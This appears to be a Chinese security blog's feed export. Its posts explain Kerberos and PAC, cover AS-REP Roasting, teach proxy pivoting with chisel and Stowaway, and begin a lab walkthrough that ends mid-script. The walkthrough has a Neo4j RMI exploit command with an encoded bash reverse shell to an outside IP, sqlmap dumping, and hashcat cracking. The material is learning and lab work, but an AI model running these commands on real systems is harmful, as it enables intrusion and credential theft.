TGS_REP"></a>TGS_REQ &amp; TGS_REP</h3><ul><li><strong>现在用户手里有了 TGT 和 TGS_Session_Key , 现在我们需要去获取服务的票证</strong></li></ul><p>现在用户如果想要连接到网络上的服务（如共享、网站或数据库）时, 他们将使用他们的 TGT 向 KDC 请求票证授予服务(TGS) 。TGS 是只允许连接到为其创建的特定服务的票证。要请求 TGS，用户将发送使用 <code>TGS_Session_Key 加密的用户名和时间戳</code> ，以及 <code>TGT</code> 和 <code>服务主体名称 (SPN)</code> ，后者指示我们打算访问的服务和服务器名称。</p><p>因此，KDC 将向我们发送一个 TGS 以及一个 Service_Session_Key，我们需要用它来验证我们想要访问的服务</p><p><strong>(这个TGS的话是使用服务拥有者自己的hash值来进行加密的  TGT的话是使用krbtgt的hash值来进行加密的)</strong></p><p><strong>TGS 使用从服务所有者哈希派生的密钥进行加密 。服务所有者是运行服务的用户或机器帐户。TGS 在其加密内容上包含 Service_Session_Key 的副本，以便服务所有者可以通过解密 TGS 来访问它。</strong></p><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9a72bf42-13db-4c2e-b1b0-e8feb2090908%2FUntitled.png" alt="img"></p><h3 id="AP-REQ-amp-AP-REP"><a href="#AP-REQ-amp-AP-REP" class="headerlink" title="AP_REQ&amp; AP_REP"></a>AP_REQ&amp; AP_REP</h3><p>然后可以将 TGS 发送到所需的服务以进行身份验证并建立连接。该服务将使用其配置的帐户密码哈希来解密 TGS 并验证 Service_Session_Key</p><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F147df7fb-a1cf-4c21-b710-c5622587fccc%2FUntitled.png" alt="img"></p><h2 id="详细流程"><a href="#详细流程" class="headerlink" title="详细流程"></a>详细流程</h2><p><strong>(上面讲的只是简单的流程  没有具体分析传了啥  干了啥)</strong></p><p>接下来的话几乎都是照搬了</p><h3 id="AS-REQ-amp-AS-REP-1"><a href="#AS-REQ-amp-AS-REP-1" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h3><h4 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h4><p>这一阶段 <code>Client</code>  向 <code>Authentication Service</code> (身份验证服务器) 发出请求, 发送以下数据:</p><ul><li>域名、用户名</li><li>KRBTGT 的 SPN (这是 KDC 的 SPN )</li><li>使用 Client 加密的时间戳 : 也就是我们的请求凭据 PA-DATA</li></ul><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2F47d2d41d-b75f-4fe5-befa-75c3b2332194%2FUntitled.png" alt="img"></p><h4 id="以下是对数据包的分析"><a href="#以下是对数据包的分析" class="headerlink" title="以下是对数据包的分析"></a>以下是对数据包的分析</h4><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2Ff9a30f9e-1fab-4937-a287-ef4c48f9f789%2FUntitled.png" alt="img"></p><p>凡是皆有例外, 对于 AS_REQ 还存在一种特殊的情况就是: 不存在 PA-ENC-TIMESTAMP字段,也就是不再发送使用用户哈希加密的时间戳, 相当于绕过了第一步校验  <strong>(就是不进行预身份验证了  这样子造成的危害就是域控的话就不会对其用户身份进行校验  就直接将TGT和Session key返回回来)</strong></p><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2F88a4148a-d876-4cb9-a8b5-94d5cfc57990%2Fas-req-2.png" alt="img"></p><p>这张图片就是显示的是  不进行预身份验证 </p><p>(PAC的话等下在后面会讲到)</p><h4 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS_REP"></a>AS_REP</h4><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2Fa71d7819-d3ea-481f-9dde-5db864b958f6%2FUntitled.png" alt="img"></p><p>KDC 中的 <code>Authentication Service</code> (身份验证服务器)  接收到 Client 发出的请求后, 到 <code>Kerberos 认证数据库</code> 根据用户查找是否存在对应的用户 <code>(此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性 )</code></p><ul><li><p>不存在用户名, 认证失败, 服务结束</p></li><li><p>存在用户, 返回响应</p><ul><li><p>使用 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client 哈希</span><br></pre></td></tr></table></figure><p> 加密一段内容进行返回 (注意这是 Client 密钥意味这 Client 端可以解密)</p><ul><li>TGS_Session_key</li><li>时间戳</li><li>TGT 的存活时间</li></ul></li><li><p>TGT (票据授予票据) : 客户端需要使用TGT去KDC中的 TGS（票据授予中心）获取访问网络服务所需的 Ticket（服务授予票据），TGT中包含的内容有 <code>User Name/ID</code>、<code>TGS Name/ID</code>、<code>IP</code>、当前时间戳、TGT 的有效时间、<code>TGS_Session_key</code>。整个TGT<code>使用 krbtgt Hash 加密</code>，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况</p></li></ul></li></ul><p>在这一阶段 AS 获取到用户名之后, 会根据对应的 用户<code>NTLM</code> 值来解密数据信息, 并且验证时间戳，之后生成随机字符串<code>TGS_Session_key</code>，使用用户的 NTLM 哈希值加密 <code>TGS_Session_key</code>，使用<code>krbtgt</code>用户的 NTLM 哈希加密<code>TGS_Session_key</code>和客户端信息 (TGT)，一起返回客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Send=user_NTML_Hash(Session Key)+krbtgt_NTML_Hash(Session Key+client_info1)[TGT]</span><br></pre></td></tr></table></figure><p><strong>现在我们自然要开始分析数据包: (这一步会发送账号所以自然会出现三种情况), 这三种情况返回的包不同, 所以我们可以基于此来进行编写工具</strong></p><ul><li><strong>用户名和密码正确</strong></li><li><strong>用户名不正确</strong></li><li><strong>用户名正确, 密码不正确</strong></li></ul><blockquote><p>密码什么时候传的?</p><p>在我们的第一阶段 AS_REQ 的时候数据包中存在一个 <code>pmdata</code> 我们将使用用户哈希加密的时间戳放在了其中  ———时间戳（使用从其密码派生的密钥加密）</p></blockquote><ol><li><strong>用户名密码正确</strong></li></ol><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2F3ea3e6fb-2959-48df-a2ab-f432a064ed88%2FUntitled.png" alt="img"></p><ol><li><strong>用户名不正确 (第一个包)</strong></li></ol><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F670a5e11-dc65-4f66-85a4-5844ae4d44ee%2FUntitled.png" alt="img"></p><ol><li><strong>用户名正确 密码不正确 （就是时间戳不对）</strong></li></ol><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbbc1056e-28b0-4094-bc6e-334aec777b74%2FUntitled.png" alt="img"></p><h3 id="TGS-REQ-amp-TGS-REP-1"><a href="#TGS-REQ-amp-TGS-REP-1" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h3><h4 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h4><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3135bb9f-5c53-4f6f-9379-5e1139deb9ee%2FUntitled.png" alt="img"></p><p>当我们的 Client 端收到 AS 发来的数据后, 会使用我们的客户端的 Hash 来解密一部分数据从而获得 TGS_Session_Key 然后开始发送, 发送内容如下</p><ul><li>AS_REP 阶段返回的 TGT 原样发送</li><li>服务主体名称: 指示我们要访问的那个服务或者服务器</li><li>使用 <code>TGS_Session_Key</code> 加密 <code>User Name</code> 和 <code>时间戳</code></li></ul><p>​    <img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2F24f1066c-ce16-44ef-a1e8-87ba331e2c68%2FUntitled.png" alt="img"></p><h4 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h4><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F117ec917-2b82-4290-b43c-6eb3d1fff5db%2FUntitled.png" alt="img"></p><p>TGS 收到用户发出的请求后, 开始了一系列操作</p><ol><li>先去检查是否存在对应的服务</li><li>KDC 对 TGT 内容进行解密<ol><li>使用 TGT 中 <code>TGS_Session_Key</code> 使用此来 TGS_REQ 阶段 Client 加密的数据</li><li>TGT 中包含 Client 端的 <code>User Name</code>和我们发送的内容进行比较</li></ol></li></ol><p><strong>一旦上述验证通过就可以进入下一步</strong></p><ol><li><p>将当前用户信息存储在 <code>TGS Cache</code> 中</p></li><li><p>TGS_Session_Key加密的内容:</p><ol><li>Service Session Key</li><li>TGS 有效时间</li><li>User nonce : 防止重放攻击</li></ol></li><li><p>TGS : 使用</p><p>对应服务的密码加密</p><p>的内容:</p><ol><li>Service Session Key</li><li>UserName/ID</li><li>TGS 有效时间</li><li>PAC</li></ol></li></ol><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2Fc96afa94-3605-42ea-8a43-b693a0ddc439%2FUntitled.png" alt="img"></p><h3 id="AP-REQ-amp-AP-REP-1"><a href="#AP-REQ-amp-AP-REP-1" class="headerlink" title="AP_REQ&amp; AP_REP"></a>AP_REQ&amp; AP_REP</h3><h4 id="AP-REQ"><a href="#AP-REQ" class="headerlink" title="AP_REQ"></a>AP_REQ</h4><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F85ecf94f-8aca-422c-92ee-a099f2d34c17%2FUntitled.png" alt="img"></p><p>客户端收到 TGS 后, 会使用在 AS_REP  阶段获取的 <code>TGS_Session_Key</code> 来解密数据从中获取到 <code>Service Session Key</code>, 然后向服务端发送数据包. 内容为:</p><ol><li>从 TGS_REP 阶段获取的  TGS 原样发送</li><li>使用Service Session Key加密的内容<ol><li>User Name/ID</li><li>时间戳</li></ol></li></ol><h4 id="AP-REP"><a href="#AP-REP" class="headerlink" title="AP_REP"></a>AP_REP</h4><p>服务端接收到用户请求后就可以开始一些操作</p><ol><li>使用服务端 Hash 解密 TGS<ol><li>验证时间戳</li><li>获取 <code>Service Session Key</code></li></ol></li><li>使用 <code>Service Session Key</code> 来解密用户传输的 <code>Autherticator</code>, 并验证其中的 <code>User Name/ID</code> 和 <code>时间戳</code></li></ol><p><strong>验证完毕后, 服务器将会返回响应:</strong></p><ul><li>将 Client 信息保存在 <code>Service Cash</code> 中</li><li>使用 <code>Service Session Key</code>加密的内容: <code>Service Name/ID``时间戳</code></li></ul><h4 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h4><p>Client 接收到服务方传来的响应, 使用在 TGS_REP 阶段获取的 Service Session Key解密, 验证是否是我们请求的服务, 验证成功后将  Servre Ticket保存到 User Cash 中</p><h2 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h2><p>PAC 是 kerberos服务票证的扩展，其中包含各种授权信息、附加凭据信息、配置文件和策略，例如用户所属的用户组、用户所具有的权限，由于在域中不同权限的用户能够访问的资源是不同的，因此微软设计PAC用来辨别用户身份和权限，当用户在Active Directory(AD)域中进行身份验证时，域控制器会将 PAC 信息添加到kerberos票证(TGT 中) , 经过一系列请求后用户访问服务, 此时服务验证 TGS 后, 如果无误就会拿着 PAC 去 KDC 那边验证用户是否有访问服务的权限</p><p><strong>这里存在一个漏洞:</strong></p><ul><li>如果不验证 PAC, 那么我们就可以制作 TGS 来访问所有服务, 这也是白银票据成功的前提</li></ul><h3 id="简略介绍"><a href="#简略介绍" class="headerlink" title="简略介绍"></a>简略介绍</h3><p>KDC 在 AS_REP 的 TGT 中增加了 Client 的 PAC , 其简单结构我们可以从下面这张图中看出, 从中我们可以看到在 PAC 的尾部其实是有两个签名的:</p><ul><li>Server Signature :</li><li>KDC Signature :</li></ul><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2F501249fb-9163-4d9b-9ed4-0ece5ef64d15%2F20201221004516-bced232a-42e2-1.png" alt="img"></p><p>现在我们在 AS_REP  阶段获取了 PAC,  为了可以将 PAC 发送到 Server 端, 微软选择了如下做法: </p><ul><li>在 TGS_REQ  阶段, 携带 PAC 的 TGT 被 TGS 服务接收后, 验证完 TGT 后就会将 PAC 解密出来, 并验证两个签名的有效性, 如果无误就认为 PAC 没有被篡改于是更换签名<ul><li>Server Signature : 使用 Server B 的密码哈希生成签名</li><li>KDC Signature : 使用 Service Session Key加密</li></ul></li><li>将重新生成的 PAC 拷贝在 TGS 中并加密起来</li></ul><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2F231e26d0-e5df-4b85-8924-aa0801fbcb0b%2F20201221004525-c25445a0-42e2-1.png" alt="img"></p><h3 id="PAC签名"><a href="#PAC签名" class="headerlink" title="PAC签名"></a>PAC签名</h3><blockquote><p>PAC中包含两个数字签名：PAC_SERVER_CHECKSUM和 PAC_PRIVSVR_CHECKSUM</p></blockquote><p>PAC_SERVER_CHECKSUM 是用<strong>服务密钥</strong>进行签名，而 PAC_PRIVSVR_CHECKSUM 使用<strong>KDC密钥</strong>进行签名，签名的原因有两个：</p><ol><li>存在带有服务密匙的签名，以验证此 PAC服务 已由服务签名。</li><li>带有KDC密匙的签名是为了防止不受信任的服务用无效的PAC为自己伪造票据。</li></ol><p>两个签名的类型分别为 PAC_SERVER_CHECKSUM 和 PAC_PRIVSVR_CHECKSUM 类型的</p><p>PAC_INFO_BUFFFER发送。在PAC数据用于访问控制之前，必须检验带有PAC_SERVER_CHECKSUM 的签名，因为这将验证客户端是否知道服务的密匙。而PAC_PRIVSVR_CHECKSUM 签名是可选的，<strong>默认不开启</strong>。它将验证PAC是否由KDC签发，而不是由KDC以外的<strong>具有访问服务密匙</strong>的第三方放入票据中。</p><h3 id="KDC-验证-PAC"><a href="#KDC-验证-PAC" class="headerlink" title="KDC 验证 PAC"></a>KDC 验证 PAC</h3><p>当服务端接收到 AP_REQ消息时，只能校验PAC_SERVER_CHECKSUM签名，并不能校验PAC_PRIVSVR_CHECKSUM 签名。</p><p>因为，如果要检验 <code>PAC_PRIVSVR_CHECKSUM</code> 签名，服务端还需要将客户端发来的ST签名中的PAC签名发回KDC进行校验。但是大部分服务默认没有开启KDC验证PAC这一步（需要目标服务主机配置为验证KDC PAC签名，默认未开启），因此服务端就无须将ST中的PAC签名发送到KDC校验了。</p><p>这也是<strong>白银票据攻击成功的前提</strong>，因为如果目标服务主机为需要校验<code>PAC_PRIVSVR_CHECKSUM</code> 签名，服务器会将这个PAC的数字签名的结果以KRB_VERIFY_PAC的消息通过RPC协议发送给KDC，KDC再将验证后这个PAC的结果以RPC返回码的形式发送回服务端，服务端根据返回的结果判断PAC的真实性与有效性。这样就算攻击者拥有服务密匙，制作ST票据，也无法伪造PAC_PRIVSVR_CHECKSUM签名，自然无法通过KDC签名校验了。</p><blockquote><p>注意：在本地系统账户下的服务，无论如果配置都不会触发KDC签名验证，也就是说SMB、CIFS、HOST等服务，无论如何都不会触发KDC验证PAC签名。</p></blockquote><h3 id="为什么KDC默认不验证PAC签名？"><a href="#为什么KDC默认不验证PAC签名？" class="headerlink" title="为什么KDC默认不验证PAC签名？"></a>为什么KDC默认不验证PAC签名？</h3><p>如果执行KDC验证PAC，意味着有响应时间和带宽使用方面的成本。它需要占用带宽在应用服务器和KDC之间传输请求和响应，这可能导致大容量应用程序服务器中出现了一些性能问题。这样的环境中可能导致额外的网络延迟和大量流量。</p><p>PAC是微软的一个特性，所以启用了PAC的域中不支持其他操作系统的的服务器，制约了域配置的灵活性。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的话其实是在thm简单的了解和查看了一遍  然后在打靶机的时候又遇到了 所以就自己写一下  加深印象&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://jtz.notion.site/Kerberos-60eca8e8fa294275a7ae5cff4b893e90&quot;&gt;参</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>AD域-预身份验证</title>
    <link href="https://ke1nys.github.io/posts/9fa2b7fe.html"/>
    <id>https://ke1nys.github.io/posts/9fa2b7fe.html</id>
    <published>2023-09-14T07:07:51.000Z</published>
    <updated>2023-09-16T11:09:31.759Z</updated>
    
    <content type="html"><![CDATA[<p>写这个知识点是因为在这个打春秋云镜的时候遇到的  所以写一下来加深印象</p><h2 id="预身份验证"><a href="#预身份验证" class="headerlink" title="预身份验证"></a>预身份验证</h2><p>在用户进行主机登录时  就会用到这个两大协议之一的<code>Kerberos</code>协议</p><p><a href="https://ke1nys.github.io/posts/1bedf17b.html">Windows域-Kerberos协议</a></p><p>其实在分析这个协议的时候就有讲到这个预身份认证</p><p>就是在这个申请这个TGT票据的时候</p><p>AS_REQ 的时候默认是会开启这个预身份验证 </p><p><img src="../images/image-20230916182929403.png" alt="image-20230916182929403"></p><p>这样子造成的危害就是域控这边的话就不会对该用户进行身份验证  然后就直接返回<code>TGT</code>和<code>session_key</code>了</p><p><strong>(如果开启的话 就不会出现这种情况  并且还可以防止在线爆破密码  因为KDC会记录失败次数 然后采取必要措施)</strong></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>那么返回这两个有什么用呢  这里的话就会用到这个<code>session_key</code>   因为这个<code>session_key</code>的话使用用户的密码hash进行加密的  所以我们在获取这个<code>session_key</code>之后  就可以进行离线爆破出密码hash  然后再通过密码hash爆破出明文密码</p><p>那么这种攻击方式的话是叫 <strong>AS-REP Roasting攻击</strong></p><ul><li>条件</li></ul><p>就是没有开启预身份验证</p><p>这里的话我们使用的是<code>GetNPUsers.py</code>这个工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/</span><br></pre></td></tr></table></figure><p>这个指令的意思是  使用任意用户向域控申请TGT票据  <strong>看哪些用户返回密码hash值</strong>  就代表其关闭了预身份验证</p><p>然后在使用hashcat来爆破这个hash值  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 1.txt -a 0 ./rockyou.txt  --force</span><br><span class="line"></span><br><span class="line">//1.txt里面存着的是获取到的hash值</span><br><span class="line">//rockyou.txt是爆破字典</span><br></pre></td></tr></table></figure><p>这里的话记录一个windows提权的方法   看别人wp的时候发现这个东西</p><p><a href="https://cloud.tencent.com/developer/article/2149150">全平台系统提权辅助工具 PEASS-ng</a></p><p><img src="../images/image-20230916190249666.png" alt="image-20230916190249666"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这个知识点是因为在这个打春秋云镜的时候遇到的  所以写一下来加深印象&lt;/p&gt;
&lt;h2 id=&quot;预身份验证&quot;&gt;&lt;a href=&quot;#预身份验证&quot; class=&quot;headerlink&quot; title=&quot;预身份验证&quot;&gt;&lt;/a&gt;预身份验证&lt;/h2&gt;&lt;p&gt;在用户进行主机登录时  就会用</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>端口转发和流量代理</title>
    <link href="https://ke1nys.github.io/posts/a5488d48.html"/>
    <id>https://ke1nys.github.io/posts/a5488d48.html</id>
    <published>2023-09-14T06:48:03.000Z</published>
    <updated>2023-10-06T09:48:21.226Z</updated>
    
    <content type="html"><![CDATA[<p>这里流量代理使用工具的话是参考这个师傅的</p><p><a href="https://fushuling.com/index.php/2023/08/26/%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86%e6%90%ad%e5%bb%ba/">fushuling</a></p><h3 id="端口转发和流量代理"><a href="#端口转发和流量代理" class="headerlink" title="端口转发和流量代理"></a>端口转发和流量代理</h3><p>虽然这里我在thm学了 但是我感觉实践起来还是有点差别的 </p><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>端口转发通常是针对特定的端口进行配置和转发。您可以选择性地将特定端口的流量转发到目标主机的对应端口。例如，您可以将本地主机的端口80转发到远程主机的端口80，实现对远程主机上的Web服务的访问。但是端口转发并不限制只能转发一个端口，您可以根据需求进行多个端口的转发配置。</p><p><img src="../images/9fb527b63773be22aa214ea2d06d1351.png" alt="img"></p><p>看这个的话 因为我们的攻击机的话是不能直接访问这个 服务器开放的端口的  我们就只能使能访问该端口的内网主机  来将端口转发出来给我们  这样的话我们的攻击机就能访问到该开放的端口</p><p><strong>(记得在自己的攻击机上将端口开放出来  用于连接转发出来的端口)</strong></p><h4 id="流量代理"><a href="#流量代理" class="headerlink" title="流量代理"></a>流量代理</h4><p>这个知识点的话就和我们使用的vpn来翻墙是一个道理的</p><p>代理可以处理多个端口的流量，并根据配置进行灵活的转发和处理。代理服务器可以接收来自客户端的请求，并将其转发到目标服务器，然后将响应返回给客户端。代理可以是基于特定协议（如HTTP代理、SOCKS代理）或应用层代理（如反向代理）。代理可以将不同端口的流量转发到不同的目标服务器上，根据具体的配置进行灵活的转发。</p><p><img src="../images/1-10.png" alt="img"></p><p>在我们拿下服务器后 因为在内网  有些服务是只能内网机器访问  我们是访问不到的  所以我们就想办法建立代理</p><p>代理的话就是让可控linux服务器作为<strong>代理服务器</strong>  然后让攻击机作为<strong>目标服务器</strong>   当我们使用攻击机来访问这个内网web服务的话  可控的这个linux服务器就会把流量转发到我们的目标服务器 使我们能过访问这个内网web服务</p><p>(其实就和我们的梯子是一个道理  如果我们直接访问<code>youtube</code>的是访问不成功的  如果我们开启vpn的话  就相当于让我们的windows主机作为目标服务器  当我们访问youtube的时候  流量就会通过这个vpn的服务器转发到我们的本机 然后我们就能访问这个youtube了)</p><h5 id="代理搭建"><a href="#代理搭建" class="headerlink" title="代理搭建"></a>代理搭建</h5><p><strong>这里我们进行流量代理的话使用的是 <a href="https://github.com/jpillora/chisel">chisel</a>这个工具</strong>  (重要的是使用的端口必须全部开放)</p><ul><li>在我们主机的vps上运行</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 1234 --reverse</span><br></pre></td></tr></table></figure><ul><li>在这台已经getshell的机器上运行：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client vpsip:1234 R:0.0.0.0:7777:socks</span><br></pre></td></tr></table></figure><ul><li>然后连接这个vps:7777的socks5代理</li></ul><p><img src="../images/image-20230914143817356.png" alt="image-20230914143817356"></p><ul><li>最后即可在本地访问内网资源</li></ul><h5 id="代理抓包"><a href="#代理抓包" class="headerlink" title="代理抓包"></a>代理抓包</h5><p>进行socks5代理后还是可以进行抓包  就是套娃  让bp来进行socks5代理</p><p>然后抓8080端口</p><ul><li>使用bp进行socks5代理</li></ul><p><img src="../images/image-20230914144146146.png" alt="image-20230914144146146"></p><ul><li>然后正常抓包抓取8080端口就行了</li></ul><p><img src="../images/image-20230914144216831.png" alt="image-20230914144216831"></p><p>这样的话就可以了</p><h3 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h3><p>先贴个地址</p><p><a href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p><p>讲下用法</p><p>这里的话是先下载两个工具<strong>(根据自己的系统来)</strong></p><p><img src="../images/image-20231006170414595.png" alt="image-20231006170414595"></p><p>下载服务器上</p><p>然后给权限后先运行</p><ul><li>第一步</li></ul><p><code>./linux_x64_admin -l 8000</code>   监听8000端口</p><ul><li>第二步  在getshell的主机上运行</li></ul><p><code>./linux_x64_agent -c 101.42.39.110:8000</code></p><p>连接到主机服务器上的8000端口</p><ul><li>第三步  开启代理和端口转发</li></ul><p><img src="../images/image-20231006170741944.png" alt="image-20231006170741944"></p><blockquote><p>use  0 是选择连接到8000端口的这个ip</p><p>socks 8080 是开启代理  配合使用proxifier就是全局代理了</p><p>backward 6060 6060 这个的话就是端口转发了   <code>backward</code>: 反向映射当前agent上的端口至admin的本地端口</p><p>//agent的话就是getshell主机上运行的</p><p>(这里如果我们想要不出网主机上线的话  就选择监听这个<strong>getshell主机内网ip</strong> + <strong>6060端口</strong>)</p><p>然后主机运行我们就可以上线了</p></blockquote><p>那么如果我们想要使用别的命令行工具怎么办 没关系  这次的话会用到proxychains4这个工具</p><h5 id="proxychains4s使用"><a href="#proxychains4s使用" class="headerlink" title="proxychains4s使用"></a>proxychains4s使用</h5><ul><li>先进行配置文件的修改</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230914144555515.png" alt="image-20230914144555515"></p><p>将配置文件末尾处的socks代理修改成自己的</p><ul><li>然后就可以进行使用了</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 sqlmap -r time.txt --dump</span><br></pre></td></tr></table></figure><p>这里演示的话是使用sqlmap工具 其他工具的话也是如此  看自己的需求</p><p><strong>这里的话MSF的也是可以使用进行流量代理的</strong>   下次再试试</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里流量代理使用工具的话是参考这个师傅的&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/08/26/%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86%e6%90%ad%e5%bb%ba/&quot;&gt;</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Time</title>
    <link href="https://ke1nys.github.io/posts/c141a014.html"/>
    <id>https://ke1nys.github.io/posts/c141a014.html</id>
    <published>2023-09-14T06:06:57.000Z</published>
    <updated>2023-10-07T12:14:50.923Z</updated>
    
    <content type="html"><![CDATA[<p>先进行扫描</p><p><img src="../images/image-20231006220555052.png" alt="image-20231006220555052"></p><p>Neoej  直接google找洞</p><p><a href="https://github.com/vulhub/vulhub/blob/master/neo4j/CVE-2021-34371/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/neo4j/CVE-2021-34371/README.zh-cn.md</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &#x27;C:\Program Files\Java\jdk1.8.0_202\bin\java.exe&#x27; -jar .\rhino_gadget.jar rmi://39.99.152.125:1337 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>反弹shell到自己的主机</p><p>home目录下存在flag</p><p>我的习惯是会再弹一个shell给msf</p><p><img src="../images/image-20231006220748775.png" alt="image-20231006220748775"></p><p>然后上传fscan开始扫描</p><p><img src="../images/image-20231006220835558.png" alt="image-20231006220835558"></p><p>信息整理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.6.36 getshell主机 linux</span><br><span class="line"></span><br><span class="line">172.22.6.25 win2019 域内主机</span><br><span class="line"></span><br><span class="line">172.22.6.12 域控主机</span><br><span class="line"></span><br><span class="line">172.22.6.38 linu机器</span><br></pre></td></tr></table></figure><p>然后挂代理 去打这个172.22.6.38</p><p><img src="../images/image-20231006220926232.png" alt="image-20231006220926232"></p><p>发现可以登录 并且不需要验证码啥的  尝试抓包sqlmap爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 sqlmap -r 1.txt --dump</span><br></pre></td></tr></table></figure><p>爆出来三个表</p><p><img src="../images/image-20231006221214453.png" alt="image-20231006221214453"></p><p><img src="../images/image-20231006221238209.png" alt="image-20231006221238209"></p><p>存在几百条用户名  </p><p>于是写个脚本将用户名提权出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 打开原始数据文件</span><br><span class="line">with open(&#x27;1.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">    data = 